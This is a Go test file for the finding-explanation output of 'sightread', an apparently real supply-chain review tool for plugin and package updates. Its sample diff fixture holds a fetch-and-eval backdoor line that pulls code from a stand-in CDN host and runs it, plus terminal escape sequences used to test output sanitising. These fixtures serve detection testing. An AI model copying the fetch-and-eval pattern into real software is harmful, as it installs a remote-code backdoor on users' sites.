// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package report

import (
	"bytes"
	"encoding/json"
	"errors"
	"strconv"
	"strings"
	"testing"

	"github.com/RhythmShahriar/rhythm/kit/cli"
	"github.com/RhythmShahriar/sightread/core"
	"github.com/RhythmShahriar/sightread/core/coretest"
)

// standIn is explain text for id in the shape package detect registers
// (numbered steps and incidents one per line), long enough to wrap.
func standIn(id string) core.Explain {
	return core.Explain{
		Why:         "A release that shows " + id + " can change what runs on every request of your site. This text stands in for the detect lane's explain YAML, which the release links.",
		HowToReview: "1. Open the flagged file at the line the finding names and read the code around it, including what calls it.\n2. Compare with the changelog.",
		FalseAlarms: "A vendored library can show the same pattern.",
		Incidents:   "Example 2024: a plugin sold to a new owner shipped " + id + ".",
		Advice:      "Review " + id + " before you update.",
		More:        helpURI(id),
	}
}

// withStandIns registers stand-in explain text for every catalogue ID.
func withStandIns(t *testing.T) {
	t.Helper()
	for _, id := range core.SignalIDs() {
		t.Cleanup(core.SwapExplain(id, standIn(id)))
	}
}

func explainer(t *testing.T) core.ExplainRenderer {
	t.Helper()
	e := core.GetExplainRenderer()
	if e == nil {
		t.Fatal("no explain renderer registered")
	}
	return e
}

// TestExplainEverySignal renders every catalogue ID into one golden, so
// a signal added to the catalogue shows up in review. A missing explain
// text would show explainMissing, which this test refuses.
func TestExplainEverySignal(t *testing.T) {
	withStandIns(t)
	var all bytes.Buffer
	for _, id := range core.SignalIDs() {
		var b bytes.Buffer
		if err := explainer(t).RenderSignal(&b, id, testOpts, false); err != nil {
			t.Fatalf("%s: %v", id, err)
		}
		out := b.String()
		if strings.Contains(out, explainMissing) {
			t.Errorf("%s: no explain text", id)
		}
		for _, want := range []string{id + ": ", "  Severity:    ", "  Confidence:  ", "  Ecosystems:  ", "\nWhy it matters\n",
			"\nHow to review\n  1. ", "\nFalse alarms\n", "\nIncidents\n", "\nMore\n  " + helpURI(id) + "\n"} {
			if !strings.Contains(out, want) {
				t.Errorf("%s: missing %q", id, want)
			}
		}
		for _, l := range strings.Split(out, "\n") {
			if len([]rune(l)) > 80 && !strings.Contains(l, "https://") {
				t.Errorf("%s: line over 80 columns: %q", id, l)
			}
		}
		all.Write(b.Bytes())
		all.WriteString("\n")
	}
	coretest.Golden(t, "explain-signals.txt", all.Bytes())
}

func TestExplainSignalLayout(t *testing.T) {
	withStandIns(t)
	var b bytes.Buffer
	if err := explainer(t).RenderSignal(&b, "integrity-mismatch", testOpts, false); err != nil {
		t.Fatal(err)
	}
	out := b.String()
	for _, want := range []string{
		"integrity-mismatch: Archive does not match the published hash\n",
		"  Severity:    critical\n  Confidence:  confirmed\n  Ecosystems:  wp-plugin, wp-theme, composer, npm\n",
		"  Unignorable: yes: it can't be ignored, allowed or lowered below critical\n",
		"\nHow to review\n  1. Open the flagged file at the line the finding names and read the code\n     around it, including what calls it.\n  2. Compare with the changelog.\n",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in\n%s", want, out)
		}
	}
}

// TestExplainMissingText: a signal without explain text says so and
// still links its reference; its JSON is not complete.
func TestExplainMissingText(t *testing.T) {
	t.Cleanup(core.SwapExplain("license-change", core.Explain{}))
	var b bytes.Buffer
	if err := explainer(t).RenderSignal(&b, "license-change", testOpts, false); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(b.String(), explainMissing) || !strings.Contains(b.String(), "\nMore\n  "+helpURI("license-change")+"\n") {
		t.Errorf("missing text not reported:\n%s", b.String())
	}
	b.Reset()
	if err := explainer(t).RenderSignal(&b, "license-change", testOpts, true); err != nil {
		t.Fatal(err)
	}
	var env struct {
		Kind     string `json:"kind"`
		Complete bool   `json:"complete"`
	}
	if err := json.Unmarshal(b.Bytes(), &env); err != nil || env.Kind != core.KindExplain || env.Complete {
		t.Errorf("JSON kind %q complete %v (%v)", env.Kind, env.Complete, err)
	}
}

func TestExplainSignalJSON(t *testing.T) {
	withStandIns(t)
	var b bytes.Buffer
	if err := explainer(t).RenderSignal(&b, "remote-fetch-exec", testOpts, true); err != nil {
		t.Fatal(err)
	}
	validateDocument(t, b.Bytes())
	coretest.Golden(t, "explain-remote-fetch-exec.json", b.Bytes())
}

func TestExplainUnknownSignal(t *testing.T) {
	t.Setenv(cli.InvokedAsEnv, "rhythm sightread")
	for id, want := range map[string]string{
		"evil":            `rhythm sightread explain: no signal "evil" (did you mean eval-dynamic?)`,
		"eval-dynamc":     `rhythm sightread explain: no signal "eval-dynamc" (did you mean eval-dynamic?)`,
		"exfil":           `rhythm sightread explain: no signal "exfil" (did you mean data-exfil?)`,
		"typo":            `rhythm sightread explain: no signal "typo" (did you mean typosquat?)`,
		"zzzzzzzz":        "rhythm sightread explain: no signal \"zzzzzzzz\"\n  rhythm sightread signals lists them",
		"x\x1b[2J\u202ey": `rhythm sightread explain: no signal "x\x1b[2J\u202ey"`,
	} {
		err := explainer(t).RenderSignal(&bytes.Buffer{}, id, testOpts, false)
		var ce *core.Error
		if !errors.As(err, &ce) || ce.Code != core.EBadFlag || ce.ExitCode() != cli.ExitUsage {
			t.Fatalf("%q: want an E13 usage error, got %v", id, err)
		}
		if got := err.Error(); !strings.HasPrefix(got, want) {
			t.Errorf("%q:\n got %q\nwant %q", id, got, want)
		}
	}
}

// renderFinding renders one finding of SampleReport.
func renderFinding(t *testing.T, sel string, hunks []core.Hunk, asJSON bool) (string, error) {
	t.Helper()
	var b bytes.Buffer
	err := explainer(t).RenderFinding(&b, coretest.SampleReport(), sel, hunks, testOpts, asJSON)
	return b.String(), err
}

// sampleHunks are what cmd reads from the cache for the remote-fetch-exec
// finding's file, with 6 lines of context.
var sampleHunks = []core.Hunk{
	{Path: "includes/other.php", OldStart: 1, OldLines: 1, NewStart: 1, NewLines: 1, Lines: []string{"-a", "+b"}},
	{Path: "includes/class-wpos-analytics.php", OldStart: 2, OldLines: 2, NewStart: 2, NewLines: 3, Lines: []string{" <?php", "+// header", " namespace W;"}},
	{Path: "includes/class-wpos-analytics.php", OldStart: 80, OldLines: 8, NewStart: 81, NewLines: 10, Lines: []string{
		" a", " b", " c", " d", " e", " function wpos_init() {", "+  $b = wp_remote_get('https://analytics.wpos-cdn.example/v2/p');",
		"+  eval($b['body']); \x1b]52;c;eA==\x07", " }", " f"}},
}

// remoteFetchIndex is the 1-based number of the remote-fetch-exec
// finding in SampleReport.
func remoteFetchIndex(t *testing.T) (int, string) {
	t.Helper()
	n := 0
	for _, u := range coretest.SampleReport().Updates {
		for _, f := range u.Findings {
			n++
			if f.ID == "remote-fetch-exec" {
				return n, f.Fingerprint
			}
		}
	}
	t.Fatal("no remote-fetch-exec finding in the sample")
	return 0, ""
}

func TestExplainFinding(t *testing.T) {
	withStandIns(t)
	n, fp := remoteFetchIndex(t)
	byIndex, err := renderFinding(t, strconv.Itoa(n), sampleHunks, false)
	if err != nil {
		t.Fatal(err)
	}
	byFP, err := renderFinding(t, strings.ToUpper(fp), sampleHunks, false)
	if err != nil {
		t.Fatal(err)
	}
	if byIndex != byFP {
		t.Error("the finding by index and by fingerprint differ")
	}
	for _, want := range []string{
		"Finding " + strconv.Itoa(n) + " of ",
		": remote-fetch-exec: Fetches remote code and runs it\n",
		"  Update:      wp-plugin countdown-timer-ultimate 2.6.7 → 2.6.8 (HOLD)\n",
		"  Where:       includes/class-wpos-analytics.php:88-104\n",
		"  Fingerprint: " + fp + "\n",
		"  Counted:     yes\n",
		"\nEvidence\n  wp_remote_get('https://analytics.wpos-cdn.example/v2/p') → eval($body)\n",
		"\nAdvice\n  Review remote-fetch-exec before you update.\n",
		"\nDiff\n  @@ -80,8 +81,10 @@ includes/class-wpos-analytics.php\n",
		`+  eval($b['body']); \x1b]52;c;eA==\x07`,
		"\nWhy it matters\n",
	} {
		if !strings.Contains(byIndex, want) {
			t.Errorf("missing %q", want)
		}
	}
	// Only the hunk that holds line 88 is shown.
	if strings.Contains(byIndex, "+// header") || strings.Contains(byIndex, "includes/other.php") {
		t.Error("a hunk that doesn't hold the finding is shown")
	}
	if strings.Contains(byIndex, "\x1b") {
		t.Error("a raw escape byte from a hunk reached the output")
	}
	coretest.Golden(t, "explain-finding.txt", []byte(byIndex))
}

func TestExplainFindingNotes(t *testing.T) {
	withStandIns(t)
	r := coretest.SampleReport()
	notes := map[string]string{}
	n := 0
	for _, u := range r.Updates {
		for _, f := range u.Findings {
			n++
			switch {
			case len(f.RaisedBy) > 0:
				notes[strconv.Itoa(n)] = "  Severity:    critical (raised by owner-change)\n"
			case f.Demoted != "":
				notes[strconv.Itoa(n)] = "  Severity:    medium (demoted: vendored path)\n"
			case f.Allowed != nil:
				notes[strconv.Itoa(n)] = "  Counted:     no: allowed by Rhythm Shahriar on 2026-10-20: new cron hook is\n"
			case f.Baselined:
				notes[strconv.Itoa(n)] = "  Counted:     no: in the baseline\n"
			}
		}
	}
	if len(notes) != 4 {
		t.Fatalf("the sample has %d of the 4 notes", len(notes))
	}
	for sel, want := range notes {
		out, err := renderFinding(t, sel, []core.Hunk{}, false)
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(out, want) {
			t.Errorf("finding %s: missing %q", sel, want)
		}
	}
}

// TestExplainFindingNoArchive: without the cached archives explain says
// how to get the hunk back; with them but no hunk for the file it says
// that instead.
func TestExplainFindingNoArchive(t *testing.T) {
	withStandIns(t)
	n, _ := remoteFetchIndex(t)
	out, err := renderFinding(t, strconv.Itoa(n), nil, false)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "\nDiff\n  "+archiveMissing+"\n") {
		t.Errorf("no archive message:\n%s", out)
	}
	out, err = renderFinding(t, strconv.Itoa(n), []core.Hunk{}, false)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, archiveMissing) || !strings.Contains(out, "no change in includes/class-wpos-analytics.php in this update's diff") {
		t.Errorf("wrong message for an empty diff:\n%s", out)
	}
	js, err := renderFinding(t, strconv.Itoa(n), nil, true)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(js, `"complete": false`) {
		t.Error("JSON without hunks is complete")
	}
}

func TestExplainFindingJSON(t *testing.T) {
	withStandIns(t)
	n, fp := remoteFetchIndex(t)
	out, err := renderFinding(t, strconv.Itoa(n), sampleHunks, true)
	if err != nil {
		t.Fatal(err)
	}
	validateDocument(t, []byte(out))
	var env struct {
		Complete bool `json:"complete"`
		Data     struct {
			Finding struct {
				Fingerprint string `json:"fingerprint"`
			} `json:"finding"`
			Hunks []jsonHunk `json:"hunks"`
		} `json:"data"`
	}
	if err := json.Unmarshal([]byte(out), &env); err != nil {
		t.Fatal(err)
	}
	if !env.Complete || env.Data.Finding.Fingerprint != fp || len(env.Data.Hunks) != 1 || env.Data.Hunks[0].NewStart != 81 {
		t.Errorf("explain JSON: %+v", env)
	}
	coretest.Golden(t, "explain-finding.json", []byte(out))
}

func TestExplainFindingSelectErrors(t *testing.T) {
	t.Setenv(cli.InvokedAsEnv, "rhythm sightread")
	total := 0
	for _, u := range coretest.SampleReport().Updates {
		total += len(u.Findings)
	}
	for sel, want := range map[string]string{
		"0":                "rhythm sightread explain: the report has no finding 0 (it has " + strconv.Itoa(total) + " findings)",
		"999":              "rhythm sightread explain: the report has no finding 999 (it has " + strconv.Itoa(total) + " findings)",
		"deadbeefdeadbeef": `rhythm sightread explain: the report has no finding with fingerprint "deadbeefdeadbeef"`,
	} {
		_, err := renderFinding(t, sel, nil, false)
		var ce *core.Error
		if !errors.As(err, &ce) || ce.Code != core.EBadFlag {
			t.Fatalf("%s: want an E13 error, got %v", sel, err)
		}
		if got := err.Error(); !strings.HasPrefix(got, want+"\n") {
			t.Errorf("%s:\n got %q\nwant %q", sel, got, want)
		}
	}
}

// validateDocument checks doc against the shipped schema.
func validateDocument(t *testing.T, doc []byte) {
	t.Helper()
	if errs := validateStrict(loadSchema(t, schemaPath), doc); len(errs) > 0 {
		t.Errorf("%s\n%s", strings.Join(errs, "\n"), doc)
	}
}

// TestExplainFindingInLockfile: a finding in the project's lockfile says
// it is outside the package (never that the archive is missing); its
// JSON is complete.
func TestExplainFindingInLockfile(t *testing.T) {
	withStandIns(t)
	r := coretest.SampleReport()
	u := &r.Updates[0]
	u.Findings = append(u.Findings, core.Finding{ID: "dependency-new", Title: "New dependency", Severity: cli.SeverityMedium,
		Confidence: core.Confirmed, File: "web/package-lock.json", Line: 9, Fingerprint: "lockfp"})
	var b bytes.Buffer
	if err := explainer(t).RenderFinding(&b, r, "lockfp", nil, testOpts, false); err != nil {
		t.Fatal(err)
	}
	out := b.String()
	if strings.Contains(out, archiveMissing) || !strings.Contains(strings.Join(strings.Fields(out), " "), "web/package-lock.json:9"+inLockfile) {
		t.Errorf("lockfile finding:\n%s", out)
	}
	b.Reset()
	if err := explainer(t).RenderFinding(&b, r, "lockfp", nil, testOpts, true); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(b.String(), `"complete": true`) {
		t.Errorf("lockfile finding JSON is not complete:\n%s", b.String())
	}
}

// TestExplainFindingLocalFile: a finding of a --to-file review whose
// report holds no hunk of its file says the local file must be given
// again, not that a rerun brings the archive back.
func TestExplainFindingLocalFile(t *testing.T) {
	withStandIns(t)
	n, _ := remoteFetchIndex(t)
	r := coretest.SampleReport()
	seen := 0
	for i := range r.Updates {
		seen += len(r.Updates[i].Findings)
		if seen >= n {
			r.Updates[i].To.Source = core.SourceLocalFile
			break
		}
	}
	var b bytes.Buffer
	if err := explainer(t).RenderFinding(&b, r, strconv.Itoa(n), nil, testOpts, false); err != nil {
		t.Fatal(err)
	}
	out := strings.Join(strings.Fields(b.String()), " ")
	if strings.Contains(out, archiveMissing) || !strings.Contains(out, localMissing) {
		t.Errorf("local file message:\n%s", b.String())
	}
}
